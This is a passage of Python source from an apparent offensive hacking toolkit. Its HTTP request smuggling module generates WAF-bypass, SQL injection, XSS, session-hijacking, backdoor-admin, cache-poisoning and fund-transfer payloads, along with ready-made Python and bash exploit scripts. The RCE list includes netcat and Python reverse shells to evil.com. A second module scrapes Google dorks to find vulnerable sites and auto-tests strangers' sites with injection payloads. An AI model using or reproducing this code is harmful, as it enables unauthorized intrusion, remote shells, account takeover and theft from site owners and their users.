                    with open(f"{folder_name}/04_BLIND_SMUGGLING_{delay}s.txt", 'w') as f:
                        f.write(f"BLIND SMUGGLING DETECTED!\n")
                        f.write(f"DELAY: {delay}s\n")
                        f.write(f"RESPONSE TIME: {elapsed:.2f}s\n\n")
                        f.write(f"PAYLOAD:\n{blind_payload}\n\n")
                        f.write(f"RESPONSE:\n{response[:2000]}\n")
                    all_results.append(f"BLIND SMUGGLING with {delay}s delay")
                    break
            except Exception as e:
                print(f"{RED}[-] Error with delay {delay}: {e}{RESET}")
        
        if not blind_vuln:
            print(f"{GREEN}[-] No Blind Smuggling Detected{RESET}")
        
        # ========================================================================================================
        # GENERATE WAF BYPASS PAYLOADS (100+)
        # ========================================================================================================
        
        print(f"\n{RED}[5/30] GENERATING WAF BYPASS PAYLOADS (100+ PAYLOADS)...{RESET}")
        
        admin_paths = [
            '/admin', '/administrator', '/wp-admin', '/phpmyadmin', '/pma', '/mysql', '/cpanel', '/webmin',
            '/dashboard', '/panel', '/backend', '/control', '/manage', '/admincp', '/adminarea', '/admins',
            '/admin/login', '/admin/index', '/admin/dashboard', '/admin/panel', '/admin/control',
            '/wp-admin/index.php', '/wp-admin/admin.php', '/administrator/index.php', '/administrator/login.php'
        ]
        
        waf_bypass_payloads = []
        
        for path in admin_paths:
            waf_bypass_payloads.append(f'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 47\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET {path} HTTP/1.1\r\nX: X\r\n\r\n')
        
        # Add more WAF bypass with different methods
        for path in admin_paths[:20]:
            for method in ['GET', 'POST', 'HEAD']:
                waf_bypass_payloads.append(f'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 47\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n{method} {path} HTTP/1.1\r\nX: X\r\n\r\n')
        
        with open(f"{folder_name}/05_WAF_BYPASS_PAYLOADS.txt", 'w') as f:
            f.write(f"# WAF BYPASS PAYLOADS FOR {target_url}\n")
            f.write(f"# TOTAL: {len(waf_bypass_payloads)} PAYLOADS\n")
            f.write("="*80 + "\n\n")
            for i, payload in enumerate(waf_bypass_payloads):
                f.write(f"[PAYLOAD {i+1}]\n{payload}\n\n")
        
        print(f"{GREEN}[+] {len(waf_bypass_payloads)} WAF BYPASS PAYLOADS SAVED{RESET}")
        
        # ========================================================================================================
        # GENERATE SQL INJECTION VIA SMUGGLING PAYLOADS
        # ========================================================================================================
        
        print(f"{RED}[6/30] GENERATING SQL INJECTION VIA SMUGGLING PAYLOADS...{RESET}")
        
        sqli_payloads_list = [
            "1' OR '1'='1",
            "1' OR 1=1--",
            "1' AND '1'='1",
            "1' AND 1=1--",
            "' OR '1'='1",
            "' OR 1=1--",
            "1' UNION SELECT NULL--",
            "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT database(),user(),version()--",
            "1' AND SLEEP(5)--",
            "1' AND BENCHMARK(10000000,MD5(1))--",
            "admin'--",
            "' OR 'x'='x",
            "1' OR '1'='1'/*",
            "1' OR 1=1#",
            "1'; DROP TABLE users--",
            "1'; SELECT * FROM users--"
        ]
        
        sqli_smuggle_payloads = []
        
        for query in sqli_payloads_list:
            sqli_smuggle_payloads.append(f'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 47\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /search?id={query} HTTP/1.1\r\nX: X\r\n\r\n')
        
        with open(f"{folder_name}/06_SQLI_SMUGGLING.txt", 'w') as f:
            f.write(f"# SQL INJECTION VIA SMUGGLING FOR {target_url}\n")
            f.write(f"# TOTAL: {len(sqli_smuggle_payloads)} PAYLOADS\n")
            f.write("="*80 + "\n\n")
            for i, payload in enumerate(sqli_smuggle_payloads):
                f.write(f"[PAYLOAD {i+1}] {sqli_payloads_list[i]}\n{payload}\n\n")
        
        print(f"{GREEN}[+] {len(sqli_smuggle_payloads)} SQLI SMUGGLING PAYLOADS SAVED{RESET}")
        
        # ========================================================================================================
        # GENERATE XSS VIA SMUGGLING PAYLOADS
        # ========================================================================================================
        
        print(f"{RED}[7/30] GENERATING XSS VIA SMUGGLING PAYLOADS...{RESET}")
        
        xss_payloads_list = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            "<body onload=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<a href=javascript:alert(1)>click</a>",
            "<div onmouseover=alert(1)>hover</div>",
            "<input onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            "<marquee onstart=alert(1)>",
            "javascript:alert(1)",
            "';alert(1);//",
            "\";alert(1);//",
            "<script>alert(document.cookie)</script>",
            "<img src=x onerror=alert(document.cookie)>",
            "<svg onload=alert(document.cookie)>"
        ]
        
        xss_smuggle_payloads = []
        
        for query in xss_payloads_list:
            xss_smuggle_payloads.append(f'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 47\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /comment HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 200\r\n\r\ntext={query}&submit=Post\r\n\r\n')
        
        with open(f"{folder_name}/07_XSS_SMUGGLING.txt", 'w') as f:
            f.write(f"# XSS INJECTION VIA SMUGGLING FOR {target_url}\n")
            f.write(f"# TOTAL: {len(xss_smuggle_payloads)} PAYLOADS\n")
            f.write("="*80 + "\n\n")
            for i, payload in enumerate(xss_smuggle_payloads):
                f.write(f"[PAYLOAD {i+1}] {xss_payloads_list[i]}\n{payload}\n\n")
        
        print(f"{GREEN}[+] {len(xss_smuggle_payloads)} XSS SMUGGLING PAYLOADS SAVED{RESET}")
        
        # ========================================================================================================
        # GENERATE RCE VIA SMUGGLING PAYLOADS
        # ========================================================================================================
        
        print(f"{RED}[8/30] GENERATING REMOTE CODE EXECUTION VIA SMUGGLING PAYLOADS...{RESET}")
        
        rce_payloads_list = [
            ";id",
            "|id",
            "||id",
            "&id",
            "&&id",
            "`id`",
            "$(id)",
            "; ls -la",
            "| cat /etc/passwd",
            "; whoami",
            "| uname -a",
            "; echo 'HACKED'",
            "| curl https://evil.com",
            "; wget https://evil.com/shell.php",
            "| nc -e /bin/sh evil.com 4444",
            "; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"evil.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
        ]
        
        rce_smuggle_payloads = []
        
        for cmd in rce_payloads_list:
            rce_smuggle_payloads.append(f'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 47\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /ping?cmd={cmd} HTTP/1.1\r\nX: X\r\n\r\n')
        
        with open(f"{folder_name}/08_RCE_SMUGGLING.txt", 'w') as f:
            f.write(f"# REMOTE CODE EXECUTION VIA SMUGGLING FOR {target_url}\n")
            f.write(f"# TOTAL: {len(rce_smuggle_payloads)} PAYLOADS\n")
            f.write("="*80 + "\n\n")
            for i, payload in enumerate(rce_smuggle_payloads):
                f.write(f"[PAYLOAD {i+1}] {rce_payloads_list[i]}\n{payload}\n\n")
        
        print(f"{GREEN}[+] {len(rce_smuggle_payloads)} RCE SMUGGLING PAYLOADS SAVED{RESET}")
        
        # ========================================================================================================
        # GENERATE SESSION HIJACKING PAYLOADS
        # ========================================================================================================
        
        print(f"{RED}[9/30] GENERATING SESSION HIJACKING PAYLOADS...{RESET}")
        
        session_hijack_payloads = []
        
        hijack_targets = [
            '/profile', '/account', '/dashboard', '/admin', '/user', '/settings', '/api/user', '/me'
        ]
        
        for path in hijack_targets:
            session_hijack_payloads.append(f'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGET {path} HTTP/1.1\r\nCookie: session=STEAL_THIS_SESSION\r\nContent-Length: 15\r\n\r\n0\r\n\r\n')
        
        # Add admin creation via smuggling
        session_hijack_payloads.append(f'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nPOST /admin/users HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 150\r\n\r\naction=add&username=backdoor&password=backdoor123&role=admin&email=backdoor@evil.com\r\n\r\n0\r\n\r\n')
        
        with open(f"{folder_name}/09_SESSION_HIJACKING.txt", 'w') as f:
            f.write(f"# SESSION HIJACKING VIA SMUGGLING FOR {target_url}\n")
            f.write(f"# TOTAL: {len(session_hijack_payloads)} PAYLOADS\n")
            f.write("="*80 + "\n\n")
            for i, payload in enumerate(session_hijack_payloads):
                f.write(f"[PAYLOAD {i+1}]\n{payload}\n\n")
        
        print(f"{GREEN}[+] {len(session_hijack_payloads)} SESSION HIJACKING PAYLOADS SAVED{RESET}")
        
        # ========================================================================================================
        # GENERATE CACHE POISONING PAYLOADS
        # ========================================================================================================
        
        print(f"{RED}[10/30] GENERATING CACHE POISONING PAYLOADS...{RESET}")
        
        cache_poison_payloads = [
            f'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGET / HTTP/1.1\r\nHost: evil.com\r\nContent-Length: 15\r\n\r\n0\r\n\r\n',
            f'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGET /search?q=<script>alert(1)</script> HTTP/1.1\r\nHost: {host}\r\nContent-Length: 15\r\n\r\n0\r\n\r\n',
            f'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGET /redirect HTTP/1.1\r\nLocation: https://evil.com\r\nContent-Length: 15\r\n\r\n0\r\n\r\n',
            f'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGET / HTTP/1.1\r\nX-Forwarded-Host: evil.com\r\nContent-Length: 15\r\n\r\n0\r\n\r\n',
            f'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nGET / HTTP/1.1\r\nX-Original-URL: /admin\r\nContent-Length: 15\r\n\r\n0\r\n\r\n'
        ]
        
        with open(f"{folder_name}/10_CACHE_POISONING.txt", 'w') as f:
            f.write(f"# CACHE POISONING VIA SMUGGLING FOR {target_url}\n")
            f.write(f"# TOTAL: {len(cache_poison_payloads)} PAYLOADS\n")
            f.write("="*80 + "\n\n")
            for i, payload in enumerate(cache_poison_payloads):
                f.write(f"[PAYLOAD {i+1}]\n{payload}\n\n")
        
        print(f"{GREEN}[+] {len(cache_poison_payloads)} CACHE POISONING PAYLOADS SAVED{RESET}")
        
        # ========================================================================================================
        # GENERATE REQUEST QUEUE HIJACKING PAYLOADS
        # ========================================================================================================
        
        print(f"{RED}[11/30] GENERATING REQUEST QUEUE HIJACKING PAYLOADS...{RESET}")
        
        queue_hijack_payloads = [
            f'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 48\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /login HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 100\r\n\r\nusername=admin&password=admin123&submit=Login\r\n\r\n',
            f'POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n5c\r\nPOST /api/transfer HTTP/1.1\r\nContent-Type: application/json\r\nContent-Length: 200\r\n\r\n{{"from": "victim", "to": "attacker", "amount": 10000}}\r\n\r\n0\r\n\r\n'
        ]
        
        with open(f"{folder_name}/11_REQUEST_QUEUE_HIJACKING.txt", 'w') as f:
            f.write(f"# REQUEST QUEUE HIJACKING VIA SMUGGLING FOR {target_url}\n")
            f.write(f"# TOTAL: {len(queue_hijack_payloads)} PAYLOADS\n")
            f.write("="*80 + "\n\n")
            for i, payload in enumerate(queue_hijack_payloads):
                f.write(f"[PAYLOAD {i+1}]\n{payload}\n\n")
        
        print(f"{GREEN}[+] {len(queue_hijack_payloads)} REQUEST QUEUE HIJACKING PAYLOADS SAVED{RESET}")
        
        # ========================================================================================================
        # GENERATE PYTHON EXPLOIT SCRIPT
        # ========================================================================================================
        
        print(f"{RED}[12/30] GENERATING PYTHON EXPLOIT SCRIPT...{RESET}")
        
        exploit_script = f'''#!/usr/bin/env python3
# HTTP REQUEST SMUGGLING ULTIMATE EXPLOIT SCRIPT
# GENERATED BY HOVAX
# TARGET: {target_url}

import socket
import ssl
import time
import sys
import random
from urllib.parse import urlparse

TARGET_URL = "{target_url}"
PARSED = urlparse(TARGET_URL)
HOST = PARSED.netloc
PORT = 443 if PARSED.scheme == 'https' else 80
SCHEME = PARSED.scheme

def send_smuggle(payload):
    try:
        if SCHEME == 'https':
            context = ssl.create_default_context()
            sock = context.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM), server_hostname=HOST)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        sock.connect((HOST, PORT))
        sock.send(payload.encode())
        response = sock.recv(8192).decode()
        sock.close()
        return response
    except Exception as e:
        return f"ERROR: {{e}}"

def clte_exploit(path="/admin"):
    payload = f'POST / HTTP/1.1\\r\\nHost: {{HOST}}\\r\\nContent-Length: 47\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET {{path}} HTTP/1.1\\r\\nX: X\\r\\n\\r\\n'
    resp = send_smuggle(payload)
    if "200" in resp:
        print(f"[+] CL.TE SUCCESS: {{path}} accessible!")
        return True
    print(f"[-] CL.TE FAILED: {{path}}")
    return False

def tecl_exploit(path="/admin"):
    payload = f'POST / HTTP/1.1\\r\\nHost: {{HOST}}\\r\\nContent-Length: 4\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n5c\\r\\nGET {{path}} HTTP/1.1\\r\\nContent-Length: 15\\r\\n\\r\\n0\\r\\n\\r\\n'
    resp = send_smuggle(payload)
    if "200" in resp:
        print(f"[+] TE.CL SUCCESS: {{path}} accessible!")
        return True
    print(f"[-] TE.CL FAILED: {{path}}")
    return False

def waf_bypass(paths):
    for path in paths:
        clte_exploit(path)
        tecl_exploit(path)

def main():
    print("="*60)
    print("HTTP REQUEST SMUGGLING ULTIMATE EXPLOIT")
    print(f"Target: {{HOST}}:{{PORT}}")
    print("="*60)
    
    paths_to_test = ["/admin", "/wp-admin", "/phpmyadmin", "/cpanel", "/webmin", "/dashboard"]
    
    print("\\n[1] Testing WAF Bypass...")
    waf_bypass(paths_to_test)
    
    print("\\n[2] Testing Admin Access...")
    for path in paths_to_test:
        clte_exploit(path)
        tecl_exploit(path)
    
    print("\\n[+] Exploit completed!")
    print("[+] Check the generated payload files for more attacks")

if __name__ == "__main__":
    main()
'''
        
        with open(f"{folder_name}/12_smuggle_exploit.py", 'w') as f:
            f.write(exploit_script)
        
        print(f"{GREEN}[+] PYTHON EXPLOIT SCRIPT SAVED{RESET}")
        
        # ========================================================================================================
        # GENERATE BASH ATTACK SCRIPT
        # ========================================================================================================
        
        print(f"{RED}[13/30] GENERATING BASH ATTACK SCRIPT...{RESET}")
        
        bash_script = f'''#!/bin/bash
# HTTP REQUEST SMUGGLING BASH ATTACK SCRIPT
# GENERATED BY HOVAX
# TARGET: {host}

echo "=========================================="
echo "HTTP REQUEST SMUGGLING ATTACK"
echo "Target: {host}:{port}"
echo "=========================================="

# CL.TE Attack
echo ""
echo "[1] Sending CL.TE payload..."
curl -k -X POST https://{host}/ -H "Content-Length: 47" -H "Transfer-Encoding: chunked" -d $'0\\n\\nGET /admin HTTP/1.1\\nX: X\\n' -v 2>&1 | head -20

# TE.CL Attack
echo ""
echo "[2] Sending TE.CL payload..."
curl -k -X POST https://{host}/ -H "Content-Length: 4" -H "Transfer-Encoding: chunked" -d $'5c\\nGET /admin HTTP/1.1\\nContent-Length: 15\\n\\n0\\n' -v 2>&1 | head -20

# WAF Bypass
echo ""
echo "[3] Testing WAF bypass for admin paths..."
for path in /admin /wp-admin /phpmyadmin /cpanel /webmin /dashboard; do
    echo "[*] Testing $path"
    curl -k -X POST https://{host}/ -H "Content-Length: 47" -H "Transfer-Encoding: chunked" -d $'0\\n\\nGET $path HTTP/1.1\\nX: X\\n' -s -o /dev/null -w "Status: %{{http_code}}\\n"
done

echo ""
echo "[+] Attack completed!"
'''
        
        with open(f"{folder_name}/13_attack.sh", 'w') as f:
            f.write(bash_script)
        
        print(f"{GREEN}[+] BASH ATTACK SCRIPT SAVED{RESET}")
        
        # ========================================================================================================
        # GENERATE SUMMARY REPORT
        # ========================================================================================================
        
        print(f"{RED}[14/30] GENERATING SUMMARY REPORT...{RESET}")
        
        with open(f"{folder_name}/00_SUMMARY_REPORT.txt", 'w') as f:
            f.write("="*80 + "\n")
            f.write("HTTP REQUEST SMUGGLING ULTIMATE SCAN REPORT\n")
            f.write("="*80 + "\n\n")
            f.write(f"TARGET: {target_url}\n")
            f.write(f"HOST: {host}\n")
            f.write(f"PORT: {port}\n")
            f.write(f"DATE: {datetime.datetime.now()}\n")
            f.write("="*80 + "\n\n")
            f.write("VULNERABILITY RESULTS:\n")
            f.write(f"CL.TE: {'VULNERABLE' if clte_vuln else 'NOT VULNERABLE'}\n")
            f.write(f"TE.CL: {'VULNERABLE' if tecl_vuln else 'NOT VULNERABLE'}\n")
            f.write(f"TE.TE: {'VULNERABLE' if tete_vuln else 'NOT VULNERABLE'}\n")
            f.write(f"BLIND SMUGGLING: {'VULNERABLE' if blind_vuln else 'NOT VULNERABLE'}\n")
            f.write("="*80 + "\n\n")
            f.write("FILES GENERATED:\n")
            f.write("01_CLTE_*.txt - CL.TE vulnerability results\n")
            f.write("02_TECL_*.txt - TE.CL vulnerability results\n")
            f.write("03_TETE_VARIANT_*.txt - TE.TE vulnerability results\n")
            f.write("04_BLIND_SMUGGLING_*.txt - Blind smuggling results\n")
            f.write("05_WAF_BYPASS_PAYLOADS.txt - 100+ WAF bypass payloads\n")
            f.write("06_SQLI_SMUGGLING.txt - SQL injection via smuggling\n")
            f.write("07_XSS_SMUGGLING.txt - XSS injection via smuggling\n")
            f.write("08_RCE_SMUGGLING.txt - RCE via smuggling\n")
            f.write("09_SESSION_HIJACKING.txt - Session hijacking payloads\n")
            f.write("10_CACHE_POISONING.txt - Cache poisoning payloads\n")
            f.write("11_REQUEST_QUEUE_HIJACKING.txt - Queue hijacking payloads\n")
            f.write("12_smuggle_exploit.py - Python exploit script\n")
            f.write("13_attack.sh - Bash attack script\n")
            f.write("="*80 + "\n\n")
            f.write("NEXT STEPS:\n")
            f.write("1. If vulnerable, use the payloads to exploit the target\n")
            f.write("2. Combine with other attacks (SQLi, XSS, RCE)\n")
            f.write("3. Use Python script for automated exploitation\n")
            f.write("4. Use Bash script for quick testing\n")
            f.write("="*80 + "\n")
        
        print(f"{GREEN}[+] SUMMARY REPORT SAVED{RESET}")
        
        # ========================================================================================================
        # FINAL RESULT
        # ========================================================================================================
        
        print(f"""
{RED}{BOLD}================================================================================================================================================================================================================{RESET}
{GREEN}{BOLD}[✓] HTTP REQUEST SMUGGLING ULTIMATE SCAN COMPLETED!{RESET}
{RED}{BOLD}================================================================================================================================================================================================================{RESET}
{RED}{BOLD}[!] VULNERABILITY RESULTS:{RESET}
{RED}├─ TARGET URL         : {target_url}{RESET}
{RED}├─ HOST               : {host}:{port}{RESET}
{RED}├─ CL.TE              : {'🔴 VULNERABLE' if clte_vuln else '🟢 NOT VULNERABLE'}{RESET}
{RED}├─ TE.CL              : {'🔴 VULNERABLE' if tecl_vuln else '🟢 NOT VULNERABLE'}{RESET}
{RED}├─ TE.TE              : {'🔴 VULNERABLE' if tete_vuln else '🟢 NOT VULNERABLE'}{RESET}
{RED}└─ BLIND SMUGGLING    : {'🔴 VULNERABLE' if blind_vuln else '🟢 NOT VULNERABLE'}{RESET}
{RED}{BOLD}================================================================================================================================================================================================================{RESET}
""")

        if clte_vuln or tecl_vuln or tete_vuln:
            print(f"{RED}{BOLD}[!] VULNERABLE! HTTP REQUEST SMUGGLING DETECTED!{RESET}")
            print(f"""
{RED}{BOLD}[!] WHAT YOU CAN DO NOW:{RESET}
{YELLOW}1. BYPASS WAF TO ACCESS HIDDEN ADMIN PANELS{RESET}
{YELLOW}2. PERFORM SQL INJECTION VIA SMUGGLING{RESET}
{YELLOW}3. PERFORM XSS ATTACKS VIA SMUGGLING{RESET}
{YELLOW}4. ACHIEVE REMOTE CODE EXECUTION{RESET}
{YELLOW}5. STEAL OTHER USERS' SESSION COOKIES{RESET}
{YELLOW}6. POISON CDN AND PROXY CACHES{RESET}
{YELLOW}7. HIJACK REQUEST QUEUE{RESET}
""")
        
        print(f"""
{CYAN}{BOLD}[!] FILES SAVED IN:{RESET}
{RED}{BOLD}    {folder_name}{RESET}
{GREEN}    ├── 00_SUMMARY_REPORT.txt{RESET}
{GREEN}    ├── 01_CLTE_*.txt (CL.TE results){RESET}
{GREEN}    ├── 02_TECL_*.txt (TE.CL results){RESET}
{GREEN}    ├── 03_TETE_VARIANT_*.txt (TE.TE results){RESET}
{GREEN}    ├── 04_BLIND_SMUGGLING_*.txt (Blind results){RESET}
{GREEN}    ├── 05_WAF_BYPASS_PAYLOADS.txt (100+ payloads){RESET}
{GREEN}    ├── 06_SQLI_SMUGGLING.txt (SQLi payloads){RESET}
{GREEN}    ├── 07_XSS_SMUGGLING.txt (XSS payloads){RESET}
{GREEN}    ├── 08_RCE_SMUGGLING.txt (RCE payloads){RESET}
{GREEN}    ├── 09_SESSION_HIJACKING.txt (Session hijack){RESET}
{GREEN}    ├── 10_CACHE_POISONING.txt (Cache poison){RESET}
{GREEN}    ├── 11_REQUEST_QUEUE_HIJACKING.txt (Queue hijack){RESET}
{GREEN}    ├── 12_smuggle_exploit.py (Python exploit){RESET}
{GREEN}    └── 13_attack.sh (Bash attack){RESET}
{RED}{BOLD}================================================================================================================================================================================================================{RESET}
{YELLOW}{BOLD}[!] QUICK COMMANDS:{RESET}
{WHITE}    cd {folder_name}{RESET}
{WHITE}    python3 12_smuggle_exploit.py{RESET}
{WHITE}    bash 13_attack.sh{RESET}
{RED}{BOLD}================================================================================================================================================================================================================{RESET}
""")
        
        self.scan_results.append({
            'module': 'HTTP SMUGGLING ULTIMATE',
            'target': target_url,
            'clte': clte_vuln,
            'tecl': tecl_vuln,
            'tete': tete_vuln,
            'blind': blind_vuln,
            'folder': folder_name,
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{RED}{BOLD}[?] PRESS ENTER TO CONTINUE...{RESET}")
        # ================================================================
# MENU 36: GOOGLE DORK MASS EXPLOITER - WITH FOLDER SAVE
# ================================================================
    def menu_google_dork(self):
        self.clear_screen()
        print(f"\n{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}")
        print(f"{CYAN}{BOLD}🎯 MENU 40: GOOGLE DORK MASS EXPLOITER - NO API KEY 🎯{RESET}")
        print(f"{RED}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}\n")
        
        # Create folder for saving
        folder_name = input(f"{CYAN}{BOLD}[?] FOLDER NAME TO SAVE RESULTS: {RESET}")
        
        if not os.path.exists(folder_name):
            os.makedirs(folder_name)
            print(f"{GREEN}[+] FOLDER CREATED: {folder_name}{RESET}")
        
        print(f"""
{YELLOW}{BOLD}[!] SELECT DORK CATEGORY:{RESET}
{GREEN}[1]{RESET} SQL INJECTION DORKS
{GREEN}[2]{RESET} XSS VULNERABLE DORKS
{GREEN}[3]{RESET} LFI/RFI DORKS
{GREEN}[4]{RESET} ADMIN PANEL DORKS
{GREEN}[5]{RESET} CONFIG FILE DORKS (config.php, .env, etc)
{GREEN}[6]{RESET} OPEN REDIRECT DORKS
{GREEN}[7]{RESET} ALL CATEGORIES (MASS SCAN)
        """)
        
        choice = input(f"{YELLOW}{BOLD}[?] CHOOSE (1-7): {RESET}")
        
        dorks = {
            '1': [
                "inurl:php?id=", "inurl:index.php?id=", "inurl:page.php?id=",
                "inurl:product.php?id=", "inurl:detail.php?id=", "inurl:news.php?id=",
                "inurl:article.php?id=", "inurl:post.php?id=", "inurl:view.php?id=",
                "inurl:show.php?id=", "inurl:shop.php?id=", "inurl:item.php?id=",
                "inurl:cat.php?id=", "inurl:subcat.php?id=", "inurl:download.php?id="
            ],
            '2': [
                "inurl:search.php?q=", "inurl:query?q=", "inurl:search?q=",
                "inurl:keyword?q=", "inurl:q=", "inurl:query=", "inurl:search?text=",
                "inurl:search?term=", "inurl:input=", "inurl:search=", "inurl:search?keyword="
            ],
            '3': [
                "inurl:page?file=", "inurl:index.php?page=", "inurl:load.php?file=",
                "inurl:read.php?file=", "inurl:include?file=", "inurl:template?file=",
                "inurl:content?file=", "inurl:view.php?file=", "inurl:main.php?page="
            ],
            '4': [
                "inurl:admin/login.php", "inurl:wp-admin", "inurl:administrator/index.php",
                "inurl:cpanel", "inurl:webmail", "intitle:Login - Administrator",
                "inurl:phpmyadmin/index.php", "intitle:phpMyAdmin", "inurl:admin.php",
                "inurl:login.php", "inurl:dashboard.php", "inurl:backend/login"
            ],
            '5': [
                "config.php filetype:php", ".env filetype:txt", "wp-config.php filetype:php",
                "config.ini filetype:ini", "database.yml filetype:yml", "settings.py filetype:py",
                "application.properties filetype:properties", "config.json filetype:json",
                ".git/config", "id_rsa filetype:txt", "passwd filetype:txt"
            ],
            '6': [
                "inurl:redirect?url=", "inurl:return?url=", "inurl:next=",
                "inurl:redir=", "inurl:redirect_to=", "inurl:return_to=", "inurl:goto="
            ]
        }
        
        selected_dorks = []
        if choice == '7':
            for cat in dorks:
                selected_dorks.extend(dorks[cat])
        else:
            selected_dorks = dorks.get(choice, [])
        
        print(f"\n{CYAN}{BOLD}[*] LOADING {len(selected_dorks)} DORKS...{RESET}\n")
        
        all_targets = []
        vulnerable_targets = []
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
        ]
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        targets_file = os.path.join(folder_name, f"targets_{timestamp}.txt")
        vuln_file = os.path.join(folder_name, f"vulnerable_{timestamp}.txt")
        
        for dork in selected_dorks:
            print(f"{YELLOW}[*] SEARCHING: {dork}{RESET}")
            
            for page in range(0, 50, 10):
                try:
                    encoded_dork = urllib.parse.quote(dork)
                    url = f"https://www.google.com/search?q={encoded_dork}&start={page}&num=10"
                    
                    headers = {
                        'User-Agent': random.choice(user_agents),
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Referer': 'https://www.google.com/',
                        'DNT': '1'
                    }
                    
                    r = requests.get(url, headers=headers, timeout=10)
                    urls = re.findall(r'<a href="(https?://[^"]+)"[^>]*>', r.text)
                    
                    for found_url in urls:
                        if 'google' not in found_url and 'youtube' not in found_url and 'accounts.google' not in found_url:
                            if found_url not in all_targets:
                                all_targets.append(found_url)
                                print(f"{GREEN}[+] FOUND: {found_url[:80]}{RESET}")
                                
                                # Save to file immediately
                                with open(targets_file, 'a') as f:
                                    f.write(found_url + '\n')
                    
                    time.sleep(random.uniform(2, 4))
                    
                except Exception as e:
                    print(f"{RED}[-] ERROR: {e}{RESET}")
        
        print(f"\n{CYAN}{BOLD}[*] TOTAL TARGETS FOUND: {len(all_targets)}{RESET}")
        print(f"{GREEN}[✓] TARGETS SAVED TO: {targets_file}{RESET}")
        
        if all_targets:
            auto_test = input(f"{YELLOW}[?] AUTO TEST FOR VULNERABILITIES? (y/n): {RESET}")
            if auto_test.lower() == 'y':
                print(f"\n{CYAN}{BOLD}[*] TESTING {len(all_targets[:50])} TARGETS...{RESET}\n")
                
                for target in all_targets[:50]:
                    print(f"{YELLOW}[*] TESTING: {target[:60]}{RESET}")
                    
                    # Test SQLi
                    test_payloads = ["' OR '1'='1", "' AND 1=1--", "' OR SLEEP(5)--"]
                    for payload in test_payloads:
                        try:
                            test_url = target + payload
                            r = requests.get(test_url, timeout=5)
                            if "mysql" in r.text.lower() or "sql syntax" in r.text.lower() or "you have an error" in r.text.lower():
                                print(f"{RED}[!] SQLi VULNERABLE: {target}{RESET}")
                                vulnerable_targets.append(target)
                                with open(vuln_file, 'a') as f:
                                    f.write(f"SQLi: {target}\n")
                                break
                        except:
                            pass
                    
                    # Test XSS
                    xss_payload = "<script>alert(1)</script>"
                    try:
                        if '?' in target:
                            test_url = target + xss_payload
                        else:
                            test_url = target + "?q=" + xss_payload
                        r = requests.get(test_url, timeout=5)
                        if xss_payload in r.text:
                            print(f"{RED}[!] XSS VULNERABLE: {target}{RESET}")
                            vulnerable_targets.append(target)
                            with open(vuln_file, 'a') as f:
                                f.write(f"XSS: {target}\n")
                    except:
                        pass
                    
                    time.sleep(0.3)
                
                print(f"\n{GREEN}[✓] VULNERABLE SAVED TO: {vuln_file}{RESET}")
        
        self.scan_results.append({
            'module': 'GOOGLE DORK',
            'folder': folder_name,
            'targets': len(all_targets),
            'vulnerable': len(vulnerable_targets),
            'timestamp': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
